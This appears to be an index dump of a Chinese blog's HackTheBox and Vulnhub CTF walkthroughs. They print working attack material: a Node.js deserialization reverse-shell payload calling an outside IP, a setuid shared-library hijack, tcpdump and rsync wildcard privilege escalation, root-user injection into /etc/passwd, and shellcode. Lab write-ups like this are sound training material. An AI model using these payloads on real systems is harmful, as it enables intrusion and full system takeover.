{system(\u0026quot;/tmp/111\u0026quot;)}' 即可得到meterpreter\n然后看到内核3.13.0 直接提\n拿到root 可以研究一下WAF 看到80是个python 真正的web再8080上 那么WAF就是个正向代理+过滤\n","id":18,"section":"posts","summary":"玄学waf+注入盒子 注意到8080是filtered 先看web checkpromo.php可以POST，image.php可能有SSRF 但是","tags":["vulnhub"],"title":"[vulnhub] 6days - Writeup","uri":"https://naivekun.com/2019/02/vulnhub-6days-wp/","year":"2019"},{"content":"暴力睡眠盒子 各种爆破。。。\n 扫端口 ftp允许匿名登录，但里面没东西\n80端口看看 挂字典爆破 admin:Password1成功登录 然而里面没东西 源码注意到 刷新一下变成了 但还是没卵用\n看看8080 在cookies里加password=123 挂字典，爆破password=xxx 密码是secret 改好cookies即可 这里面是个nc ??? 尝试命令注入。。。然而过滤了所有符号 那这咋整\n这不就是个SSRF嘛 探测本地端口 生成个1-65535挂wfuzz上 11211是啥 原来是memcached google学习一波咋用 stats看看 知道有两个keys stock和users 注意到这两个本来都是空的 拿web随便访问一下，里面才有内容 80登录口随便搞搞，这里get一下 服务端把整个users表缓存进去了。。。 把得到的数据处理一下，得到大概500个用户名和md5的组合。。。 先把用户名怼到ssh上，枚举用户 对应的md5解密，得到密码 ssh登录，得到user.txt 内核提权不行 sudo -l看看 这个东西是瞎搞的，下下来反汇编看看 只会瞎胡输出\n脚本枚举一下看看 注意到两个东西 myexec和ldconfig myexec拉下来反汇编 是个辣鸡密码 s3cur3l0g1n 后面 调用了seclogin() 应该是库里的 ldd看看 libseclogin.so 看看 啥都没用\n之前发现ldconfig有suid 那么可以改共享库，把myexec里的函数重写\n#include\u0026lt;stdlib.h\u0026gt;\rint printf()\r{\rsetuid(0);\rsetgid(0);\rsystem(\u0026quot;/bin/bash\u0026quot;);\r}\r /etc/ld.so.conf.d发现test.conf 把编译好的libseclogin.so丢进/tmp ldconfig myexec 出题人应该是想让改seclogin() 但是输密码麻烦。。。暴力改printf吧\n","id":19,"section":"posts","summary":"暴力睡眠盒子 各种爆破。。。 扫端口 ftp允许匿名登录，但里面没东西 80端口看看 挂字典爆破 admin:Password1成功登录 然而里面没东西 源","tags":["HackTheBox"],"title":"[hackthebox] Dab - Writeup","uri":"https://naivekun.com/2019/02/htb-dab-wp/","year":"2019"},{"content":"超级无敌神仙盒子 扫端口 就开了个1880 是个nodejs 网页图标？？？ google搜一下 是node red 网页提示不能get 换成post 访问http://10.10.10.94:1880/red/dd33f9468a4ef248ce06f7a28452b5fe/\n瞎胡google一下，搭一个shell出来 在docker里\n 第一层内网 看下ip 传个meterpreter，autoroute挂进去 准备日内网 探测一下主机 172.18.0.0/24只有172.18.0.2一台 172.19.0.0/24有172.19.0.2 .3 .4共三台，其中.4是第一个docker proxychains代理nmap扫端口 172.19.0.2开了80 172.19.0.3开了6379\n网页源码 什么鬼。。。 172.19.0.3的redis写shell 反弹，得到172.19.0.2的www-data的shell 看一下ip 瓜皮？？？ 这个docker跨172.19和172.20网段 不管，先提下172.19.0.2再说 注意到/backup/backup.sh 计划任务里这个脚本每三分钟以root权限运行一次 突破口是这句rsync -a *.rdb rsync://backup:873/src/rdb/ 那个*号，可以构造畸形文件名，结合gtfobins，比如-e sh xxx.rdb 这个文件以rdb结尾，那句命令执行时，就拼接成 rsync -a -e sh xxx.rdb rsync://backup:873/src/rdb/ 就以root身份执行了sh xxx.rdb 把恶意代码放到xxx.rdb里就行 这个docker太精简，meterpreter直接段错误。。。 尝试留suid，4755即可 拿到root 在somaro中找到user.txt\n 第二层内网 接着日172.20网段， 探测主机，有172.20.0.2和172.20.0.3 跨19和20那个docker完全残废一个，没法传nmap 常规日内网比较困难，只能单端口转发\n注意到刚才那个backup.sh 用rsync上传和下载文件 rsync -a rsync://backup:873/src/backup/ /var/www/html/ 这句，换成rsync -a rsync://backup:873/src/etc/shadow lll 这说明backup主机(172.20.0.3)的rsync://backup:873/src/就是根目录！ 写计划任务，弹shell即可 拿到172.20.0.3的shell 看起来是到头了（ 注意到目前是在docker里，然而/dev下东西很多，不像纯docker 全挂载上，翻一翻 找到root.txt 其他几个是别的docker的文件系统，还有母鸡的boot分区和swap分区  后记 盒子太TM难了。。。懒得写太多 实际过程中各种端口转发，正代，反代及其智障，乱七八糟，毕竟两层内网。。。 只有第一个docker能连外网 补一张拓扑图 ","id":20,"section":"posts","summary":"超级无敌神仙盒子 扫端口 就开了个1880 是个nodejs 网页图标？？？ google搜一下 是node red 网页提示不能get 换成post 访问http","tags":["HackTheBox"],"title":"[hackthebox] Reddish - Writeup","uri":"https://naivekun.com/2019/01/htb-reddish-wp/","year":"2019"},{"content":"扫端口 好多 web啥都没有 irc? 找洞直接日 拿到低权限shell\n这里可以直接提权到root 先看user.txt 没法读 有个.backup 提示隐写 隐写？ web有个图片 使用steghide和密码UPupDOWNdownLRlrBAbaSSss 拿这个密码即可登录djmardov 拿到user.txt\n当然，可以直接提权，然后读root.txt\n找找suid 这是啥 生成个后门，丢到/tmp/listusers即可 拿到root ","id":21,"section":"posts","summary":"扫端口 好多 web啥都没有 irc? 找洞直接日 拿到低权限shell 这里可以直接提权到root 先看user.txt 没法读 有个.backup 提示隐写 隐写？","tags":["HackTheBox"],"title":"[hackthebox] Irked - Writeup","uri":"https://naivekun.com/2019/01/htb-irked-wp/","year":"2019"},{"content":"扫端口，开了80，445，8808 8808是个helloworld页面 445匿名用户没权限 先看80的web 弱密码没有，注入没有 注册个用户，登录看看 可以创建笔记 有个tyler@secnotes.htb提示有个用户tyler 插笔记处注入无解，xss无解 重置密码处看起来没法改别人的\n可以社客服 可能模拟的客服会点击链接 随便填个链接试试 看一下密码重置的请求 转成get 丢到客服里 这样如果客服点这个，客服就会把自己的密码改成123456 之后使用用户tyler和密码123456成功登录 得到一个凭据 这里有另外一个方法 注入无解，应该是mysql_prepare了 考虑二次注入 注册个用户叫naivekun' or 1=1-- -+ 登录 这应该是在查询notes的时候没有prepare，直接把用户名带着查的 可以看到所有人，包括管理员的notes\nsmbclient连进去 new-site???就是8808那个web 传个一句话 这里就可以拿到user.txt了\n准备提权 这里很坑。。。windows10有个defender meterpreter必挂 只能用nishang或者nc弹回个powershell\nubuntu.zip 这是wsl bash一下 已经是root 然而/mnt/c还是没权限 看看.bash_history 得到administrator的密码 psexec即可拿到shell ","id":22,"section":"posts","summary":"扫端口，开了80，445，8808 8808是个helloworld页面 445匿名用户没权限 先看80的web 弱密码没有，注入没有 注册个用户，登","tags":["HackTheBox"],"title":"[hackthebox] Secnotes - Writeup","uri":"https://naivekun.com/2019/01/htb-secnotes-wp/","year":"2019"},{"content":"第一次日这种难度的盒子。。。 4个docker跑在一个母鸡上。。。 flag在母鸡上。。。 然而网络端口全是docker里的\n扫端口 两个都是python开的\n80看看 貌似。。。web里下了毒 啥都是200 还会返回垃圾字符串 传统的扫目录不行\n再看看8080 一个登录框 没注入。。。 先搞80\n用wfuzz，过滤掉初始页面和垃圾串 wfuzz -u http://10.10.10.96/FUZZ -w /usr/share/wordlists/dirb/small.txt --hw 1,4 有个users 看看 加个\u0026rsquo; 报错\n练习一波手注 注意到用户dorthi和一个10.100的ip 说明这个后端正运行在某种虚拟化容器中 先注入再说 表 两个表的字段 看users表 是一些哈希 处理一下 确定哈希类型 看看hashcat examples 后端是python 这个django很像 然而长度对不上。。。 哈希的前缀是$pbkdf2-sha256 暴力改格式，改成这样 python改一下 丢进hashcat里 这是第三个哈希 那么得到一组用户凭据 用户名：wizard.oz 密码： wizardofoz22 登录8080端口的web\n右上角有个增加，但是加不进去。。。 抓包看看 有回显 后端是python 考虑模板注入 果然有 用tplmap 可以命令执行，不过没有回显 ping一下自己，tcpdump一下 说明命令成功执行 弹个shell回来，升级成meterpreter 根目录发现.dockerenv 现在在docker里 到处翻翻\n找找数据库配置 得到一个凭据 N0Pl4c3L1keH0me 接着找 根目录有个.secert 看看 敲门，发现10.10.10.96打开了ssh 刚才那个凭据不行。。。 咋整。。。\n回到刚才注入那一点，发现用户dorthi 尝试load_file 把文件名hex一下 可以读文件 尝试读dorthi用户的ssh私钥 python处理一下 得到私钥 之前敲门已经打开了ssh 直接连 私钥有密码，尝试那个数据库密码，成功登录 emmmm 登进母鸡里了 可以拿到user的flag了 准备提权\nsudo -l看看 列出docker的虚拟网络 挨个看看 扫扫各个网段和ip 整理一下 网络拓扑如下 突破口是172那个docker面板\ngoogle一下portainer 1.11 exploit 任意用户密码重置 用ssh -D做个转发 重置admin的 成功登录 由于目标环境没外网 看看它有哪些仓库 随便找个小的，把母鸡的/挂载到/mnt，打开shell 部署，打开console 艹 太小的没bash 换个大的 重复之前步骤，换那个python的容器 已经把母鸡挂到docker里了 可以读shadow 还有root的flag 把dorthi用户加进sudoers里即可拿到母鸡的root shell 留个suid也行 略\n","id":23,"section":"posts","summary":"第一次日这种难度的盒子。。。 4个docker跑在一个母鸡上。。。 flag在母鸡上。。。 然而网络端口全是docker里的 扫端口 两个都是pyth","tags":["HackTheBox"],"title":"[hackthebox] Oz - Writeup","uri":"https://naivekun.com/2019/01/htb-oz-writeup/","year":"2019"},{"content":"只开了22和666 666上是一个nodejs的web\n抓包 cookies有个base64串 直接刷新会报错 看到serialize\n把之前那个串base64解密 注意到这个json是错的 把后面那个expires改好，直接上反序列化payload {\u0026quot;username\u0026quot;:\u0026quot;_$$ND_FUNC$$_function (){require(\\\u0026quot;child_process\\\u0026quot;).exec(\\\u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|telnet 192.168.20.146 4442 \u0026gt;/tmp/f\\\u0026quot;)}()\u0026quot;,\u0026quot;csrftoken\u0026quot;:\u0026quot;test\u0026quot;,\u0026quot;Expires\u0026quot;:\u0026quot;Friday, 13 Oct 2018 00:00:00 GMT\u0026quot;} 拿到shell 用户是nodeadmin\n提权 有个fireman用户 看进程 开了一个sha和d0w谐s0cks 发现这个libss有个rce 直接拿目标上的nc连 写个meterpreter然后弹回来 拿到fireman sudo -l 发现tcpdump 查查gtfobins 命令执行即可\nCOMMAND='弹回meterpreter'\rTF=$(mktemp)\recho \u0026quot;$COMMAND\u0026quot; \u0026gt; $TF\rchmod +x $TF\rsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\r 记得加后面-Z root，gtfo上没有 用远端shell ping一下localhost tcpdump结束后就会以root身份运行COMMAND 拿到root ","id":24,"section":"posts","summary":"只开了22和666 666上是一个nodejs的web 抓包 cookies有个base64串 直接刷新会报错 看到serialize 把之前那个串ba","tags":["vulnhub"],"title":"[Vulnhub] Temple of Doom - Writeup","uri":"https://naivekun.com/2019/01/vulnhub-temple-of-doom-wp/","year":"2019"},{"content":"盒子介绍\nFlags: There are 5 flags that should be discovered in form of: Country_name Flag: [md5 hash]. In CTF platform of the CTF-USV competition there was a hint available for each flag, but accessing it would imply a penalty. If you need any of those hints to solve the challenge, send me a message on Twitter @gusu_oana and I will be glad to help. The countries that should be tracked for flags are: Croatia, France, Italy, Laos, Phillippines\r 有5个flag\n扫端口 开了一堆 80有个web 15020有个https的web 21那个ftp有个rce，但没法登录 先看80的web\n扫目录，有个/admin2 发现这个网页没有后端。。。 看源码 这是啥？？？ 格式化之后，翻译一下 先把第一个数组元素换成ascii 被混淆了？？？ 变量名改改，var1和var2没啥用 pig是输入的数据 意思就是pig变量经过一系列计算之后结果要是1079950212331060 倒推 这里有个坑点，第一个+相当于strcat 第二个-之后才是数字运算 所以password是77779673 拿到第一个flag\n再看那个15020端口的 首先打开网页提示证书有问题 翻翻证书 得到第二个flag France:a51f0eda836e4461c3316a2ec9dad743\n扫目录发现/blog和/vault 先看blog 是个cms??? 注入无果 有个后台/admin 看源码 download.php看看 get不行 换成post 任意文件读 /etc/passwd发现用户kevin和oana 尝试读/home/kevin/flag.txt得到第三个flag 看看vault wget整站下载，去除html 发现 有个流量包 是个802.11的 转成hccapx 拿rockyou跑 得到凭据minion.666\n尝试登录后台admin:minion.666 翻源码 第四个flag\nedit.php显然存在注入 sqlmap \u0026ndash;dump弄不出数据 尝试一条一条读 得到最后一个flag Laos:66c578605c1c63db9e8f0aba923d0c12\n然而还是日不穿盒子。。。\n","id":25,"section":"posts","summary":"盒子介绍 Flags: There are 5 flags that should be discovered in form of: Country_name Flag: [md5 hash]. In CTF platform of the CTF-USV competition there was a hint available for each flag, but accessing it would imply a penalty. If you need any of those hints to solve the challenge, send me a message on Twitter @gusu_oana and I will be glad to help. The countries that","tags":["vulnhub"],"title":"[Vulnhub] CTF-USV-2017 - Writeup","uri":"https://naivekun.com/2019/01/vulnhub-ctf-usv-2017-wp/","year":"2019"},{"content":"只开了80和22\nweb看看\n这里会显示UA 这里没啥东西 源码就这一点\nUA 首先想到shellshock () {:;}; echo \u0026quot;fuck\u0026quot;;没用。。。 扫目录没啥东西 网站logo好像有些信息 Cyberdog Sledding Panel 把UA改成这个？ 哈\n进入这个目录/myuploader_priv 是个上传 文件类型没任何过滤 但是文件大小限制8字节！！！ 那玩个锤子 \u0026lt;?php ?\u0026gt;就已经8个字节了 Google一下，可以这样\n\u0026lt;?=`ls`;\r 中间用反引号括住 只能容下ls了 运行一下 那一长串是啥 提示进入下一个目录找 当然要hint 给了源码 要三个md5一样的字符串 有个工具-\u0026gt;传送门 可以生成213个md5一样的文件 找3个，url编码一下，丢进burp里就行 给了个shell 弹回meterpreter 准备提权\n4.9的内核 suid没东西 有个todo.txt 那个.secret_message读不了 里面没东西 只知道有个用户downfall 记得开始那个robots.txt提示rockyou 那。。。ssh跑字典吧 懒 密码是secretlyinlove 在rockyou十分之一的位置 可以读那个.secret_message 应该是个计划任务 看起来它把python当成shell脚本执行了 加个#!/usr/bin/python 带个反弹shell 拿到root ","id":26,"section":"posts","summary":"只开了80和22 web看看 这里会显示UA 这里没啥东西 源码就这一点 UA 首先想到shellshock () {:;}; echo \u0026quot;fuck\u0026quot;;没用。","tags":["vulnhub"],"title":"[Vulnhub] Homeless - Writeup","uri":"https://naivekun.com/2019/01/vulnhub-homeless-wp/","year":"2019"},{"content":"超级好玩的盒子 共7个flag\n扫端口 开了好多东西 25端口的SMTP看一下 那一串欢迎信息是啥？？？ 16进制？ 解码看看 得到第三个flag FL46_3:29dryf67uheht2r1dd4qppuey474svxya\n80端口看看 robots.txt一堆东西 这咋整。。。 一个个试。。。都没啥用 扫目录 一个一个试 发现/control有东西 翻一下。。。 woc是个纯静态页面。。。 看源码 第一个flag FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w\n再翻翻，发现/control/js目录下有东西 这是第二个flag 把0和1换成十进制 FL46_2:39331r42q2svdfsxk9i13ry4f2srtr98h2 这里有个问题。。。 考虑换行符，flag比其他的多一位，不考虑换行符，flag比其他的少一位。。。 网上的其他writeup都是多一位的。。。\n网页源码还有个注释 提示了个新域名 D0Not5topMe.ctf 加进hosts里 进去看看 是个phpbb 这。。。 慢慢翻 注册页面发现个标签 访问/FLaR6yF1nD3rZ_html brainfuck解码 得到第4个flag FL46_4:n02bv1rx5se4560984eedchjs72hsusu9\n接着日cms 本来想着注入。。。 报错信息包含了个邮箱 Megusta@G4M35.ctf 把域名G4M35.ctf加进hosts里，进去看看 是个游戏 拿burp一点点翻 猜测可能游戏逻辑存在提示 找通关或者gameover的地方 提示目录/H3x6L64m3 去看看\nwoc 是个逮虾户游戏 还是翻源码。。。翻了半天没东西 那就回去玩会游戏 注意到天空贴图有一些字符？？？ 刷新一下，翻翻贴图文件 找到这张图 把这些数字手敲出来\n106 114 64 66 137 65 72 60 71 153 70 67 150 66 147 64 145 62 65 147 150 64 64 167 141 61 162 171 142 171 146 151 70 71 70 150 156 143 144 164\r 这是ASCII？？？ 出来是乱码 那。。。8进制？ 拿python转成10进制，再按ASCII转成字符 得到第五个flag FL46_5:09k87h6g4e25gh44wa1rybyfi898hncdt\n回头翻游戏逻辑 艹 原来漏掉了 t3rm1n4l.ctf 加到hosts里\n去看看 是个辣鸡terminal 密码直接就是域名t3rm1n4l.ctf 瞎胡试试。。。 只有pwd id grep能用 grep *看看 提示下一个域名M36u574.ctf 加到hosts里\n访问M36u574.ctf 大概每秒刷新一张图片？？？ 看看burp 一直是megusta+数字.jpg 写个脚本，把megusta001.jpg到megusta010.jpg下下来 隐写？？？ exif没东西鸭 是不是漏了什么 继续刷新 终于发现 exiftool发现comment有东西 base64 解码结果是 MeGustaKing:$6$e1.2NcUo$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY/O40pZ30\nhashcat+rockyou 直接跑 密码是？？？ 10个* 艹 还以为是hashcat坏了。。。 ssh登录 ？？？ 什么鬼 先把上面那一长串解码 这啥。。。 不管，把中间那段Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK解码 得到第六个flag FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey\n分析ssh的输出信息 提示用户burtieo 密码是啥。。。 提示rockyou.txt hydra爆破 艹 太慢了。。。 瞎胡试，发现密码试这个。。。 Lets you update your FunNotes and more! 登录\n是个rbash 没法逃逸。。。 发现个suedoh 运行一下 什么智障设计，居然要卡30秒。。 可以运行/usr/bin/wmstrt 这是个啥。。。 倒计时？？？ 还带嘲讽的？？？ 注意到运行的时候10000端口打开了 是个http服务 webmin??? 登录？？？ 20秒爆破个锤子。。。 找洞吧 发现这个能用 读shadow 跑了一下，发现密码是password 然而ssh不让登录 那。。。找ssh私钥 拿私钥登录 发现要密码 ssh2john之后拿john跑rockyou即可 密码是gustateamo 登录\n拿到root 第七个flag呢 发现两个文件 第一个是个elf 丢进ida 艹 就个printf 第二个看看\n#!/usr/bin/perl -w\r######################################################\r# #\r# W311 D0n3 #\r# Y0u D1d N0t5top #\r# Much0 M3Gu5t4 :D #\r# #\r# 3mrgnc3 #\r# #\r# Hope you had fun... #\r# 8ut... #\r# #\r# p.s.. #\r# 571ll 1 M0r3 f146 :D #\r# #\r######################################################\ruse IO::Socket;\rif(!($ARGV[1]))\r{\rprint \u0026quot;Usage: L45T_fl46.pl \u0026lt;user\u0026gt; \u0026lt;flag\u0026gt;\\n\\n\u0026quot;;\rexit;\r}\r$shellcode =\t\u0026quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\u0026quot; .\r\u0026quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x38\u0026quot; .\r\u0026quot;\\x00\\x00\\x00\\x59\\x41\\x59\\x20\\x46\\x4c\\x34\\x36\\x5f\\x37\u0026quot; .\r\u0026quot;\\x3a\\x39\\x74\\x6a\\x74\\x38\\x36\\x65\\x76\\x76\\x63\\x79\\x77\u0026quot; .\r\u0026quot;\\x75\\x75\\x66\\x37\\x37\\x34\\x68\\x72\\x38\\x38\\x65\\x75\\x69\u0026quot; .\r\u0026quot;\\x33\\x6e\\x75\\x73\\x38\\x64\\x6c\\x6b\\x20\\x32\\x3e\\x2f\\x74\u0026quot; .\r\u0026quot;\\x6d\\x70\\x2f\\x68\\x75\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026quot; .\r\u0026quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\u0026quot; .\r\u0026quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x38\u0026quot; .\r\u0026quot;\\x00\\x00\\x00\\x59\\x41\\x59\\x20\\x46\\x4c\\x34\\x36\\x5f\\x37\u0026quot; .\r\u0026quot;\\x3a\\x39\\x74\\x6a\\x74\\x38\\x36\\x65\\x76\\x76\\x63\\x79\\x77\u0026quot; .\r\u0026quot;\\x75\\x75\\x66\\x37\\x37\\x34\\x68\\x72\\x38\\x38\\x65\\x75\\x69\u0026quot; .\r\u0026quot;\\x33\\x6e\\x75\\x73\\x38\\x64\\x6c\\x6b\\x20\\x32\\x3e\\x2f\\x74\u0026quot; .\r\u0026quot;\\x6d\\x70\\x2f\\x68\\x75\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026quot; .\r\u0026quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\u0026quot; .\r\u0026quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x38\u0026quot; .\r\u0026quot;\\x00\\x00\\x00\\x59\\x41\\x59\\x20\\x46\\x4c\\x34\\x36\\x5f\\x37\u0026quot; .\r\u0026quot;\\x3a\\x39\\x74\\x6a\\x74\\x38\\x36\\x65\\x76\\x76\\x63\\x79\\x77\u0026quot; .\r\u0026quot;\\x75\\x75\\x66\\x37\\x37\\x34\\x68\\x72\\x38\\x38\\x65\\x75\\x69\u0026quot; .\r\u0026quot;\\x33\\x6e\\x75\\x73\\x38\\x64\\x6c\\x6b\\x20\\x32\\x3e\\x2f\\x74\u0026quot; .\r\u0026quot;\\x6d\\x70\\x2f\\x68\\x75\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026quot; .\r\u0026quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\u0026quot; .\r\u0026quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x38\u0026quot; .\r\u0026quot;\\x00\\x00\\x00\\x59\\x41\\x59\\x20\\x46\\x4c\\x34\\x36\\x5f\\x37\u0026quot; .\r\u0026quot;\\x3a\\x39\\x74\\x6a\\x74\\x38\\x36\\x65\\x76\\x76\\x63\\x79\\x77\u0026quot; .\r\u0026quot;\\x75\\x75\\x66\\x37\\x37\\x34\\x68\\x72\\x38\\x38\\x65\\x75\\x69\u0026quot; .\r\u0026quot;\\x33\\x6e\\x75\\x73\\x38\\x64\\x6c\\x6b\\x20\\x32\\x3e\\x2f\\x74\u0026quot; .\r\u0026quot;\\x6d\\x70\\x2f\\x68\\x75\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026quot; .\r\u0026quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\u0026quot; .\r\u0026quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x38\u0026quot; .\r\u0026quot;\\x00\\x00\\x00\\x59\\x41\\x59\\x20\\x46\\x4c\\x34\\x36\\x5f\\x37\u0026quot; .\r\u0026quot;\\x3a\\x39\\x74\\x6a\\x74\\x38\\x36\\x65\\x76\\x76\\x63\\x79\\x77\u0026quot; .\r\u0026quot;\\x75\\x75\\x66\\x37\\x37\\x34\\x68\\x72\\x38\\x38\\x65\\x75\\x69\u0026quot; .\r\u0026quot;\\x33\\x6e\\x75\\x73\\x38\\x64\\x6c\\x6b\\x20\\x32\\x3e\\x2f\\x74\u0026quot; .\r\u0026quot;\\x6d\\x70\\x2f\\x68\\x75\\x68\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\u0026quot; .\r\u0026quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\u0026quot; .\r\u0026quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x2d\u0026quot; .\r\u0026quot;\\x00\\x00\\x00\\x4e\\x33\\x76\\x33\\x72\\x20\\x41\\x73\\x35\\x75\u0026quot; .\r\u0026quot;\\x6d\\x33\\x21\\x20\\x31\\x74\\x20\\x4d\\x34\\x6b\\x33\\x35\\x20\u0026quot; .\r\u0026quot;\\x34\\x6e\\x20\\x34\\x35\\x35\\x20\\x30\\x66\\x20\\x79\\x30\\x75\u0026quot; .\r\u0026quot;\\x20\\x26\\x20\\x6d\\x33\\x20\\x3a\\x44\\x00\\x57\\x53\\x89\\xe1\u0026quot; .\r\u0026quot;\\xcd\\x80\u0026quot; ;\r$root = IO::Socket::INET-\u0026gt;new(Proto=\u0026gt;'tcp',\rPeerAddr=\u0026gt;$ARGV[0],\rPeerPort=\u0026gt;$ARGV[1])\ror die \u0026quot;Unable to use [$ARGV[0]] to open [$ARGV[1]]\u0026quot;;\r$ebp = \u0026quot;TROLLOOOLLO\u0026quot;;\r$eip = \u0026quot;\\xBA\\xDF\\x00\\xD0\u0026quot;;\r$flag7 = \u0026quot;RUN /\u0026quot; . \u0026quot;a\u0026quot;x1036 . $ebp . $eip . $shellcode . \u0026quot; HTTTPEE/1.1\\n\\n\u0026quot;;\rprint $root $flag7;\rsleep(5);\rprint \u0026quot;Done.\\n\u0026quot;;\rclose($root);\rexit;\r shellcode??? 我不会逆向啊。。。 把那个shellcode变量暴力转成ascii 哈 找到第七个flag FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk\n 累死了。。。\n","id":27,"section":"posts","summary":"超级好玩的盒子 共7个flag 扫端口 开了好多东西 25端口的SMTP看一下 那一串欢迎信息是啥？？？ 16进制？ 解码看看 得到第三个flag FL46_3:29dryf67uheht2r1dd4qppuey474svxya 80端口","tags":["vulnhub"],"title":"[Vulnhub] d0not5top: 1.2 - Writeup","uri":"https://naivekun.com/2019/01/vulnhub-d0not5top-wp/","year":"2019"},{"content":"80端口是个drupal 直接上msf得到低权限shell 之后提权\n有两条路\n1. SUID find / -perm -u+s -type f 2\u0026gt;/dev/null 发现/opt下有东西 是个elf strings看一下 生成个elf格式的meterpreter放到/tmp 之后把PATH改成/tmp即可 拿到root\n2. passwd /etc/passwd权限是777 ??? 写个root用户进去就行 生成密码哈希，密码是foo perl -le 'print crypt(\u0026quot;foo\u0026quot;, \u0026quot;aa\u0026quot;)' 写到passwd里 echo \u0026quot;naivekun:aaKNIEDOaueR6:0:0:root:/root:/bin/bash\u0026quot; \u0026gt;\u0026gt; passwd 拿到root\n","id":28,"section":"posts","summary":"80端口是个drupal 直接上msf得到低权限shell 之后提权 有两条路 1. SUID find / -perm -u+s -type f 2\u0026gt;/dev/null 发现/opt下有东西 是个elf strings看一下","tags":["vulnhub"],"title":"[Vulnhub] billu: b0x 2 - Writeup","uri":"https://naivekun.com/2019/01/vulnhub-bb2-wp/","year":"2019"},{"content":"教学用盒子 。。。\n1. NFS 挂载 看到uid gid分别为1001 1005 本地建个用户，暴力改uid gid su过去 可以看到用户已经变成了自己的 写ssh公钥 2. docker peter用户在docker组中 docker run -v /:/hostOS -i -t chrisfosterelli/rootplease 拿到root 3. 杂项 chmod 6755 filename 留suid后门\n","id":29,"section":"posts","summary":"教学用盒子 。。。 1. NFS 挂载 看到uid gid分别为1001 1005 本地建个用户，暴力改uid gid su过去 可以看到用户已经变成了自己的 写ssh公钥 2. docker pe","tags":["vulnhub"],"title":"[Vulnhub] lin.security - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-lin-security-wp/","year":"2018"},{"content":"扫端口 80端口是个啥都没有的静态页面 8080是个jenkins登录框 扫目录 去看看 跑一下md5 得到用户凭据 尝试登录8080上的jenkins后台 eder:vipsu成功登录 Google一下jenkins后台咋日 这个东西貌似可以任意代码执行 msf有个工具 拿到shell 准备提权 内核。。。放弃 suid没东西 777权限的找一找 发现/etc/script/CleaningScript.sh echo一个web delivery即可 拿到flag ","id":30,"section":"posts","summary":"扫端口 80端口是个啥都没有的静态页面 8080是个jenkins登录框 扫目录 去看看 跑一下md5 得到用户凭据 尝试登录8080上的jenkins后","tags":["vulnhub"],"title":"[Vulnhub] jarbas - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-jarbas-wp/","year":"2018"},{"content":"扫端口 就开了22和80 看web 一个登录框 robots.txt有东西 看看 第一个flag 用户凭据和第二个flag 拿这个凭据登录 一个上传。。。 没有任何过滤 传个meterpreter即可 web根目录发现hint.txt 找到第三个flag和提示 用户technawi的密码？？？ 又tm要找东西。。。 grep -rnw technawi 最后在这里找到 拿到第4个flag和technawi的账号和密码 ssh登录 内核版本低 直接提权 拿到第五个flag ","id":31,"section":"posts","summary":"扫端口 就开了22和80 看web 一个登录框 robots.txt有东西 看看 第一个flag 用户凭据和第二个flag 拿这个凭据登录 一个上传。。。 没有","tags":["vulnhub"],"title":"[Vulnhub] JIS-CTF - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-jis-ctf-wp/","year":"2018"},{"content":"从web入手？？？ 啥都没找到。。。 4555端口有个james-admin??? 浏览器打不开。。。 Google一下 原来是拿nc连的 弱密码root:root直接登录 把用户的密码全改成1 翻邮件 得到用户凭据 mindy:P@55W0rd1!2@ ssh登录 读到user.txt ？？？ 是个rbash ssh后加命令，逃逸 准备提权 4.9的内核 找找高权限的 所有者是root 777权限 估计是个计划任务 把反弹shell命令echo进去就行 成功拿到root ","id":32,"section":"posts","summary":"从web入手？？？ 啥都没找到。。。 4555端口有个james-admin??? 浏览器打不开。。。 Google一下 原来是拿nc连的 弱密码roo","tags":["vulnhub"],"title":"[Vulnhub] SolidState - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-solidstate-wp/","year":"2018"},{"content":"扫端口 卧槽，，， 太长了。。。 先看80 有个/mongoadmin/目录 去看看 什么鬼。。。没认证 得到一个凭据typhoon:789456123\n接下来。。。 有%d种方法日掉这个盒子\n1. FTP 匿名登录啥都没有 拿刚才的凭据登录 .ssh眼前一亮 发现私钥 私钥密码和用户密码一样，789456123 拿到用户typhoon的shell\n2. SMTP 占坑 好像有个shellshock 日不掉\n3. DNS 域传送漏洞 dig一下 果然有 还有一个flag 